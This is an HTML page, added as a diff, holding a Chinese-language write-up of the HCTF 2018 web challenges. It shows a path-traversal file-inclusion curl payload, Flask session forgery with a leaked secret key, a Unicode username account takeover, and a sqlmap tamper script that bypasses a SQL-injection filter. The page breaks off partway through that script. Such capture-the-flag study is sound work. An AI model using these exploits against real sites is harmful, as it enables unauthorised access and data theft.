@@ -1,0 +1,2229 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Tianji">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Tianji">
+    <meta name="keywords" content="hctf2018 | Tianji">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>hctf2018 · Tianji&#39;s Blog</title>
+    <!-- 设置密码 -->
+    <script>
+        (function(){
+            if('hctf'){
+                if (prompt('请输入文章密码','') !== 'hctf'){
+                    alert('密码错误！');
+                    history.back();
+                }
+            }
+        })();
+    </script>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180721" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180721" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin="">
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin="">
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Tianji&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">hctf2018</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Tianji's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="height:50vh;">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            hctf2018
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">4,123</span> / Reading time: <span class="post-count">23 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/11/11</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;">
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&apos;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&apos;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&apos;file&apos;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<p><code>curl &quot;http://warmup.2018.hctf.io/index.php&quot; -d &quot;file=hint.php?/../ffffllllaaaagggg&quot;</code></p>
+<h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>flask的session保存在cookie中，并通过密钥校验session的正确性。如果知道密钥，也就可以任意伪造session.</p>
+<p>使用工具:<a href="https://github.com/noraj/flask-session-cookie-manager" rel="external nofollow" target="_blank">https://github.com/noraj/flask-session-cookie-manager</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/hctf$ python session_manager.py decode -c ".eJw9kEGLwjAQhf_KMmcPmtWL4EGIlQozRUgNmYu4bW0bExeqUhvxv290wdMw8-C9-d4D9seuujQwv3a3agT7toT5A75-YA68zmfGbqcUlkOmE2f8zpJdCfSrPpP13YSdxVD3JIse1zhluXGZ2jiyyxnJekrCCONzQap0RpkxqaTBeGeZDxQSS5objBOlGTKVfse8iVHUsCpPvN5OUEev4JpMrwRLHEjnA6r0TqE5sXQxZzuLe0CdL-A5guLSHffX31N1_iCgXN7JJ62x7F8or9fZlh4FedJpxMgHjhoKduzZUogx9eJt1_pDXX2ctC7Tov9XzgcfBbi2h3PZ9jfbwghul6p7lweTMTz_ADRccOA.W-gvYA.qZr8vZsK6dpC8j6l3v-Oavi_KQc"</span><br><span class="line">&#123;"_fresh":true,"_id":&#123;" b":"ZGU5YjQ4NzAyOWFlYmVjNjE2MmEwODgxYzVjMzgwNDcwMGM4ZDJlOTJlNjA5NDg4N2Y2YmU2NTdlYTY0NTFhMDg4ZDUyNzFjNWZhMzFjMDYyOTI3ZGU1YTNhZTdkZGQ1MWJlNzlhOWE2ZDMyNWUyMTIxNzhkZDllNjQ5MTIzMWU="&#125;,"csrf_token":&#123;" b":"MDAxNmFiYjZmYjQ4MmEwZjdmM2NmNWIwODUyZjZmM2ZlZmZjNzMyNg=="&#125;,"image":&#123;" b":"WWdIcw=="&#125;,"name":"tiandiwuji","user_id":"10"&#125;</span><br></pre></td></tr></table></figure>
+<p>网站源代码:</p>
+<p><code>https://github.com/woadsl1234/hctf_flask/</code></p>
+<p>通过源码我们可以看到：</p>
+<p><code>SECRET_KEY = os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;</code></p>
+<p>尝试使用<code>ckj123</code>查看我们的cookie:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/hctf$ python session_manager.py decode -c ".eJw9kEGLwjAQhf_KMmcPmtWL4EGIlQozRUgNmYu4bW0bExeqUhvxv290wdMw8-C9-d4D9seuujQwv3a3agT7toT5A75-YA68zmfGbqcUlkOmE2f8zpJdCfSrPpP13YSdxVD3JIse1zhluXGZ2jiyyxnJekrCCONzQap0RpkxqaTBeGeZDxQSS5objBOlGTKVfse8iVHUsCpPvN5OUEev4JpMrwRLHEjnA6r0TqE5sXQxZzuLe0CdL-A5guLSHffX31N1_iCgXN7JJ62x7F8or9fZlh4FedJpxMgHjhoKduzZUogx9eJt1_pDXX2ctC7Tov9XzgcfBbi2h3PZ9jfbwghul6p7lweTMTz_ADRccOA.W-gvYA.qZr8vZsK6dpC8j6l3v-Oavi_KQc" -s "ckj123"</span><br><span class="line">&#123;u'csrf_token': '0016abb6fb482a0f7f3cf5b0852f6f3feffc7326', u'user_id': u'10', u'name': u'tiandiwuji', u'image': 'YgHs', u'_fresh': True, u'_id': 'de9b487029aebec6162a0881c5c3804700c8d2e92e6094887f6be657ea6451a088d5271c5fa31c062927de5a3ae7ddd51be79a9a6d325e212178dd9e6491231e'&#125;</span><br><span class="line"></span><br><span class="line">qianfa@qianfa:~/Desktop/hctf$ tf$ python session_managerdecode -c ".eJw9kEGLwjAQhf_KMmcPmtWL4EGIlQozRUgNmYu4bW0bExeqUhvxv290wdMw8-C9-d4D9seuujQwv3a3agT7toT5A75-YA68zmfGbqcUlkOmE2f8zpJdCfSrPpP13YSdxVD3JIse1zhluXGZ2jiyyxnJekrCCONzQap0RpkxqaTBeGeZDxQSS5objBOlGTKVfse8iVHUsCpPvN5OUEev4JpMrwRLHEjnA6r0TqE5sXQxZzuLe0CdL-A5guLSHffX31N1_iCgXN7JJ62x7F8or9fZlh4FedJpxMgHjhoKduzZUogx9eJt1_pDXX2ctC7Tov9XzgcfBbi2h3PZ9jfbwghul6p7lweTMTz_ADRccOA.W-gvYA.qZr8vZsK6dpC8j6l3v-Oavi_KQc" -s "ckj1234"</span><br><span class="line">[Decoding error]Signature 'qZr8vZsK6dpC8j6l3v-Oavi_KQc' does not match</span><br></pre></td></tr></table></figure>
+<p>我们发现<code>ckj123</code>就是真实的密钥。</p>
+<p>然后就可以伪造session:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/hctf$ python session_manager.py encode -t &quot;&#123;u&apos;csrf_token&apos;: &apos;0016abb6fb482a0f7f3cf5b0852f6f3feffc7326&apos;, u&apos;user_id&apos;: u&apos;10&apos;, u&apos;name&apos;: u&apos;admin&apos;, u&apos;image&apos;: &apos;YgHs&apos;, u&apos;_fresh&apos;: True, u&apos;_id&apos;: &apos;de9b487029aebec6162a0881c5c3804700c8d2e92e6094887f6be657ea6451a088d5271c5fa31c062927de5a3ae7ddd51be79a9a6d325e212178dd9e6491231e&apos;&#125;&quot; -s &quot;ckj123&quot;</span><br><span class="line">.eJw9kEGLwjAQhf_KMmcPmtWL4EGIlQozRUgNmYu4bW0bExeqUhvxv290wdMw8-C9-d4D9seuujQwv3a3agT7toT5A75-YA68zmfGbqcUlkOmE2f8zpJdCfSrPpP13YSdxVD3JIse1zhluXGZ2jiyyxnJekrCCONzQap0RpkxqaTBeGeZDxQSS5objBOlGTKVfse8iVHUsCpPvN5OUEev4JpMrwRLHEjnA6r0TqE5sXQxZzuLe0CdL-A5guLSHffX31N1_iCgXN7JJ62x7F8or9fZlh4FedJpxMgHjhoKduzZUogx9eJt1_pDXX2ctC7Tov9XzgcfBTiUvj3DCG6Xqnv3BpMxPP8A9uFusQ.W-gwhQ.zuBhgwJ6v79wrzxKJSPGygiZ56M</span><br></pre></td></tr></table></figure>
+<p>这时候，就可以得到flag了。</p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>参考链接:<code>http://blog.lnyas.xyz/?p=1411</code></p>
+<p>注册的用户名经过strlower后才与已有的用户名进行比较。</p>
+<p><img src="/assets/hctf/t0109f51089bc019aa6.png" alt=""></p>
+<p>在change密码这里，更改密码之前又经过了一次strower,</p>
+<p><img src="/assets/hctf/t01c1054d9fd6eecb31.png" alt=""></p>
+<p>注册一个ᴬdmin用户，登陆可以看到第一次strower把ᴬdmin变成了Admin，与admin不同所以注册成功。</p>
+<p>然后更改密码，这里是第二次strower操作，Aadmin会变成admin，最终更改的是admin的密码。 最后退出，再用正常的admin登陆即可</p>
+<p>方法三:</p>
+<p>条件竞争</p>
+<h2 id="Kzone"><a href="#Kzone" class="headerlink" title="Kzone"></a>Kzone</h2><p>问题主要出在member.php中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_COOKIE[&quot;islogin&quot;])) &#123;</span><br><span class="line">    if ($_COOKIE[&quot;login_data&quot;]) &#123;</span><br><span class="line">        $login_data = json_decode($_COOKIE[&apos;login_data&apos;], true);</span><br><span class="line">        $admin_user = $login_data[&apos;admin_user&apos;];</span><br><span class="line">        $udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&apos;$admin_user&apos; limit 1&quot;);</span><br><span class="line">        if ($udata[&apos;username&apos;] == &apos;&apos;) &#123;</span><br><span class="line">            setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">            setcookie(&quot;login_data&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">        &#125;</span><br><span class="line">        $admin_pass = sha1($udata[&apos;password&apos;] . LOGIN_KEY);</span><br><span class="line">        if ($admin_pass == $login_data[&apos;admin_pass&apos;]) &#123;</span><br><span class="line">            $islogin = 1;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">            setcookie(&quot;login_data&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&apos;$admin_user&apos; limit 1&quot;);</span><br><span class="line">if ($udata[&apos;username&apos;] == &apos;&apos;) &#123;</span><br><span class="line">    setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">    setcookie(&quot;login_data&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">&#125;</span><br><span class="line">$admin_pass = sha1($udata[&apos;password&apos;] . LOGIN_KEY);</span><br></pre></td></tr></table></figure>
+<p>如果\$udata从数据库中没有找到任何值，那么\$udata[‘password’]就是null，这样\$admin_pass就等于<code>sha1(LOGIN_KEY)</code>也就是:<code>3aa526bed244d14a09ddcc49ba36684866ec7661</code></p>
+<p>waf.php:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function waf($string)</span><br><span class="line">&#123;</span><br><span class="line">    $blacklist = &apos;/union|ascii|mid|left|greatest|least|substr|sleep|or|benark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&apos;;</span><br><span class="line">    return preg_replace_callback($blacklist, function ($match) &#123;</span><br><span class="line">        return &apos;@&apos; . $match[0] . &apos;@&apos;;</span><br><span class="line">    &#125;, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这样，就过滤了<code>information</code>。可以使用<code>mysql.innodb_table_stats</code>绕过。</p>
+<p>所以可以构造如下payload，sql语句能够成功读到admin的记录时，由于密码不对，将无法登录成功。当sql语句无法读到admin的记录时，就可以成功登录，这样便可以进行bool注入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;admin_user&quot;:&quot;admin&apos;&amp;&amp;right((select(@@secure_file_priv)),%d)in(%s)&amp;&amp;\&apos;1&quot;,&quot;admin_pass&quot;:&quot;3aa526bed244d14a09ddcc49ba36684866ec7661&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>可是，想到获得数据表名，便需要<code>information_schema</code>，但是<code>or</code>被过滤了。</p>
+<p>可以看到,</p>
+<p><code>$login_data = json_decode($_COOKIE[&#39;login_data&#39;], true);</code></p>
+<p>这一行，在过滤之后才执行，所以可以通过编码绕过。<code>json_decode</code>会进行解码操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = payload.replace(&apos;u&apos;, &apos;u0075&apos;)</span><br><span class="line">payload = payload.replace(&apos;o&apos;, &apos;u006f&apos;)</span><br><span class="line">payload = payload.replace(&apos;i&apos;, &apos;u0069&apos;)</span><br><span class="line">payload = payload.replace(&apos;&apos;&apos;, &apos;u0027&apos;)</span><br><span class="line">payload = payload.replace(&apos;&quot;&apos;, &apos;u0022&apos;)</span><br><span class="line">payload = payload.replace(&apos; &apos;, &apos;u0020&apos;)</span><br><span class="line">payload = payload.replace(&apos;s&apos;, &apos;u0073&apos;)</span><br><span class="line">payload = payload.replace(&apos;#&apos;, &apos;u0023&apos;)</span><br><span class="line">payload = payload.replace(&apos;&gt;&apos;, &apos;u003e&apos;)</span><br><span class="line">payload = payload.replace(&apos;&lt;&apos;, &apos;u003c&apos;)</span><br><span class="line">payload = payload.replace(&apos;-&apos;, &apos;u002d&apos;)</span><br><span class="line">payload = payload.replace(&apos;=&apos;, &apos;u003d&apos;)</span><br></pre></td></tr></table></figure>
+<h3 id="方法一（Ricterz）"><a href="#方法一（Ricterz）" class="headerlink" title="方法一（Ricterz）:"></a>方法一（Ricterz）:</h3><p>参考链接:<code>http://www.melodia.pw/?p=918</code></p>
+<p>通过sqlmap执行:</p>
+<p>编写tamper:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    data = &apos;&apos;&apos;&#123;&quot;admin_user&quot;:&quot;admin%s&quot;,&quot;admin_pass&quot;:65&#125;;&apos;&apos;&apos;</span><br><span class="line">    payload = payload.lower()</span><br><span class="line">    payload = payload.replace(&apos;u&apos;, &apos;u0075&apos;)</span><br><span class="line">    payload = payload.replace(&apos;o&apos;, &apos;u006f&apos;)</span><br><span class="line">    payload = payload.replace(&apos;i&apos;, &apos;u0069&apos;)</span><br><span class="line">    payload = payload.replace(&apos;&apos;&apos;, &apos;u0027&apos;)</span><br><span class="line">    payload = payload.replace(&apos;&quot;&apos;, &apos;u0022&apos;)</span><br><span class="line">    payload = payload.replace(&apos; &apos;, &apos;u0020&apos;)</span><br><span class="line">    payload = 